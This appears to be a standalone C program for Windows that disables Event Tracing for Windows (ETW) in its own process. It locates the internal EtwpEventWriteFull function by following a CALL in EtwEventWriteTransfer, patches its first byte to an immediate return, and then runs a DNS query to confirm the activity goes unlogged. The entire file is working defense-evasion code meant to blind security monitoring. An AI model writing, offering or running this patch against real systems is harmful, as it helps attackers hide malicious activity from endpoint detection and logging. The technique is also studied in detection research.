#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <windns.h>

#pragma comment(lib, "dnsapi.lib")

#define PATCH_SIZE 1  // Size of the patch (RET instruction)

int main() {
    // Step 1: Get the ntdll.dll module base address
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("Failed to get ntdll\n");
        return 1;
    }
    printf("Image base of ntdll.dll: %p\n", ntdll);

    // Step 2: Find the address of EtwEventWriteTransfer
    const char* functionName = "EtwEventWriteTransfer";
    uint8_t* etwEventWrite = (uint8_t*)GetProcAddress(ntdll, functionName);
    if (!etwEventWrite) {
        printf("Failed to find EtwEventWrite\n");
        return 1;
    }

    printf("EtwEventWrite address: %p\n", etwEventWrite);

    // Step 3: Search for CALL instruction (0xE8) and find EtwpEventWriteFull address
    for (int i = 0; i < 128; ++i) {
        if (etwEventWrite[i] == 0xE8) {
            // Extract the relative offset for the CALL instruction
            int32_t relOffset = *(int32_t*)(etwEventWrite + i + 1);
            uint8_t* target = etwEventWrite + i + 5 + relOffset;

            // Step 4: Check if the target address (EtwpEventWriteFull) is in executable memory
            MEMORY_BASIC_INFORMATION mbi = { 0 };
            if (VirtualQuery(target, &mbi, sizeof(mbi)) &&
                mbi.State == MEM_COMMIT &&
                (mbi.Protect & (PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))) {

                printf("Likely EtwpEventWriteFull address: %p (relative call at offset %d)\n", target, i);

                // Step 5: Patch the EtwpEventWriteFull function with an early RET (0XC3) instruction
                DWORD oldProtect;
                if (VirtualProtect(target, PATCH_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                    *(target) = 0xC3; 
                    // Restore original protection
                    VirtualProtect(target, PATCH_SIZE, oldProtect, &oldProtect);
                    printf("Successfully patched EtwpEventWriteFull to return immediately.\n");

                    // Test if ETW is silenced
                    DNS_RECORD* queryResult = NULL;
                    DNS_STATUS status = DnsQuery_A(
                        "example.com",          
                        DNS_TYPE_A,             
                        DNS_QUERY_STANDARD,     
                        NULL,                  
                        &queryResult,           
                        NULL                  
                    );

                    if (status == 0) {
                        printf("DnsQuery_A succeeded and should not be logged to ETW.\n");
                        DnsRecordListFree(queryResult, DnsFreeRecordList);
                    } else {
                        printf("DnsQuery_A failed: %ld\n", status);
                    }
                    
                } else {
                    printf("Failed to change memory protection for patching.\n");
                    return 1;
                }

                break;
            }
        }
    }

    return 0;
}
